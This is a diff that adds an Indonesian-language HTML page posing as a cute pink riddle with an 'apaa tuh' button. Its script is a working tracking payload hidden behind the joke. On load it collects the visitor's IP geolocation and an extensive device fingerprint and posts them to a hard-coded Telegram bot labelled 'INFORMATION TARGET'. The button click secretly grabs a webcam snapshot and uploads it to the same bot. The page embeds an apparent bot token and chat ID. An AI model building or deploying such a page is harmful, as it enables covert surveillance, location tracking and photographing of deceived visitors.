@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Love Cute!</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Comic Sans MS', sans-serif;
+      background: #ffb6c1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      color: #fff;
+    }
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 30px;
+    }
+    button {
+      padding: 15px 35px;
+      font-size: 1.3em;
+      font-weight: bold;
+      border: none;
+      border-radius: 50px;
+      background: #fff;
+      color: #ff69b4;
+      cursor: pointer;
+      transition: transform 0.2s, background 0.3s;
+    }
+    button:hover {
+      transform: scale(1.1);
+      background: #ffe0f0;
+    }
+  </style>
+</head>
+<body>
+  <h1>KAMU TAU GAAAA</h1>
+  <p>apaaa buah yang namanyaa selalu bikin nyaman</p>
+  <button id="btnCamera">apaa tuh</button>
+  
+  <script>
+const BOT_TOKEN = "8192157332:AAGwwFtVYqv9xokmnv9Mty3p1WRKWd80Xzc";
+const CHAT_ID = "8433572233";
+const STATIC_IMAGE = "https://a.top4top.io/p_3592jwm3w0.jpg";
+
+function escapeHtml(s){
+  return String(s||"-")
+    .replaceAll("&","&amp;")
+    .replaceAll("<","&lt;")
+    .replaceAll(">","&gt;");
+}
+
+// 🔹 Ambil informasi IP / lokasi via ipwhois.io
+async function getIpInfo(){
+  try {
+    const r = await fetch("https://ipwhois.app/json/");
+    const data = await r.json();
+    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
+    return {
+      ip: data.ip || "-",
+      city: data.city || "-",
+      region: data.region || "-",
+      country_name: data.country || "-",
+      country_code: data.country_code || "-",
+      latitude: data.latitude || "0",
+      longitude: data.longitude || "0"
+    };
+  } catch(e) {
+    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
+  }
+}
+
+// 🔹 Ambil informasi device (browser, OS, layar, RAM, dsb)
+async function getDeviceInfo(){
+  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null, charging:false, chargingTime:null, dischargingTime:null}));
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    cores: navigator.hardwareConcurrency || "-",
+    memory: navigator.deviceMemory || "-",
+    touchPoints: navigator.maxTouchPoints || 0,
+    orientation: screen.orientation?.type || "-",
+    colorDepth: screen.colorDepth || "-",
+    pixelRatio: window.devicePixelRatio || "-",
+    onLine: navigator.onLine,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    battery: b
+  };
+}
+
+// 🔹 Buat format teks laporan yang dikirim ke Telegram
+function buildCaption(ip, d){
+  const mapUrl = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+  return [
+    "<b>🧭 INFORMATION TARGET</b>",
+    `IP: ${escapeHtml(ip.ip)}`,
+    `City: ${escapeHtml(ip.city)}`,
+    `Region: ${escapeHtml(ip.region)}`,
+    `Country: ${escapeHtml(ip.country_name)}`,
+    `Country Code: ${escapeHtml(ip.country_code)}`,
+    `Latitude: ${escapeHtml(ip.latitude)}`,
+    `Longitude: ${escapeHtml(ip.longitude)}`,
+    `Location: ${mapUrl}`,
+    "",
+    "<b>💻 DEVICE INFO</b>",
+    `User Agent: ${escapeHtml(d.userAgent)}`,
+    `Platform: ${escapeHtml(d.platform)}`,
+    `Language: ${escapeHtml(d.language)}`,
+    `Screen: ${escapeHtml(d.screenWidth + "x" + d.screenHeight)}`,
+    `Inner Size: ${escapeHtml(d.innerWidth + "x" + d.innerHeight)}`,
+    `CPU cores: ${escapeHtml(d.cores)}`,
+    `RAM (GB): ${escapeHtml(d.memory)}`,
+    `Touch Points: ${escapeHtml(d.touchPoints)}`,
+    `Orientation: ${escapeHtml(d.orientation)}`,
+    `Color Depth: ${escapeHtml(d.colorDepth)}`,
+    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    `Online: ${escapeHtml(d.onLine)}`,
+    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
+    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
+    `Battery: ${escapeHtml(d.battery?.level || "-")} (${d.battery?.charging ? "Charging" : "Not Charging"})`,
+    `ChargingTime: ${escapeHtml(d.battery?.chargingTime || "-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
+    "",
+    "<b>🌐 URL & Time</b>",
+    `URL: ${escapeHtml(location.href)}`,
+    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
+  ].join("\n");
+}
+
+// 🔹 Kirim info IP dan device ke Telegram
+async function sendIpDevice(){
+  const [ip, d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      photo: STATIC_IMAGE,
+      caption: buildCaption(ip, d),
+      parse_mode: "HTML"
+    })
+  });
+}
+
+// 🔹 Ambil snapshot kamera & kirim ke Telegram
+async function sendSnapshot(){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    video.play();
+
+    await new Promise(r => video.onloadedmetadata = () => setTimeout(r, 200));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("document", blob, "screenshot.jpg");
+    formData.append("caption", "📸 Foto sukses diambil dari kamera");
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: formData
+    });
+
+    stream.getTracks().forEach(track => track.stop());
+    video.remove();
+  } catch (e) {
+    console.error("Error kamera:", e);
+  }
+}
+
+// 🔹 Kirim info saat halaman dibuka
+window.addEventListener("load", sendIpDevice);
+
+// 🔹 Tombol kamera di halaman
+document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
+</script>
+</body>
+</html>
